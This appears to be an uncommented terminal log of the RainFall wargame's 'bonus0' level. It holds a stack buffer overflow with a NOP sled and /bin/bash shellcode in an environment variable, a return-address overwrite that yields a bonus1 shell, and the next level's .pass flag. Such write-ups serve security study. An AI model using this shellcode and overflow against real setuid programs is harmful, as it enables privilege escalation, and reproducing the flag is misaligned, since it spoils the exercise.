python -c 'print "A"*4095 + "\n" + "B"*14 + "\x40\xc5\xff\xff" + "A\n"' > /tmp/a

bonus0@RainFall:~$ export SHELLCODE=`python -c 'print "\x90"*4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
bonus0@RainFall:~$ cd /tmp/
bonus0@RainFall:/tmp$ ./bonus0 
0xbfffe905
bonus0@RainFall:/tmp$ cd
bonus0@RainFall:~$ python
Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0xbfffe905 + 512)
'0xbfffeb05L'
>>> 
bonus0@RainFall:~$ python -c 'print "A"*4095 + "\n" + "B"*14 + "\x05\xeb\xff\xbf" + "A\n"' > /tmp/a
bonus0@RainFall:~$ cat /tmp/a - | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBB���A BBBBBBBBBBBBBB���A
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

